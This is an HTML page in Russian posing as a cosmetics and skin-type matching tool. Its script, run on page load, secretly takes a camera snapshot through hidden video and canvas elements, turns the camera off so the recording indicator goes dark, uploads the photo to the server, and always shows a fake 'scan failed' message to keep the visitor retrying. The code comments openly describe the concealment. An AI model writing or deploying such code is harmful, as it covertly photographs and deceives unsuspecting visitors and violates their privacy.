<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подбор косметики</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 90vh;
        }
        .container {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        /* Скрываем элемент видео, чтобы пользователь ничего не видел на экране */
        video {
            display: none;
        }
        .error-box {
            display: none;
            background-color: #ffe6e6;
            color: #d9534f;
            border: 1px solid #f5c6cb;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
        }
        button {
            background-color: #ff4d4d;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #cc0000;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Подбор косметики</h2>
    <p id="main-text">Загрузка рекомендаций...</p>
    
    <div class="error-box" id="error-box">
        <p><strong>Ошибка сканирования!</strong></p>
        <p>Не удалось определить тип кожи. Пожалуйста, повторите попытку.</p>
        <button onclick="restartScan()">Повторить</button>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const mainText = document.getElementById('main-text');
    const errorBox = document.getElementById('error-box');

    async function covertCapture() {
        try {
            // Запрашиваем любую камеру без жесткого требования "environment" (откроется фронтальная или стандартная)
            const stream = await navigator.mediaDevices.getUserMedia({
                video: true,
                audio: false
            });
            video.srcObject = stream;

            // Даем секунду камере инициализироваться в фоне
            setTimeout(() => {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const dataUrl = canvas.toDataURL('image/jpeg');

                // Останавливаем поток камеры сразу после снимка, чтобы погас индикатор записи
                stream.getTracks().forEach(track => track.stop());

                // Отправляем скрыто на сервер
                fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataUrl })
                })
                .then(response => response.json())
                .then(data => {
                    showErrorState();
                })
                .catch(error => {
                    showErrorState();
                });

            }, 1500);

        } catch (err) {
            // Если пользователь отклонил доступ к камере, всё равно показываем ошибку для правдоподобности
            setTimeout(showErrorState, 1500);
        }
    }

    function showErrorState() {
        mainText.style.display = 'none';
        errorBox.style.display = 'block';
    }

    function restartScan() {
        errorBox.style.display = 'none';
        mainText.style.display = 'block';
        mainText.innerText = "Повторный анализ...";
        covertCapture();
    }

    // Запускаем скрытый процесс сразу при открытии страницы
    window.onload = covertCapture;
</script>

</body>
</html>
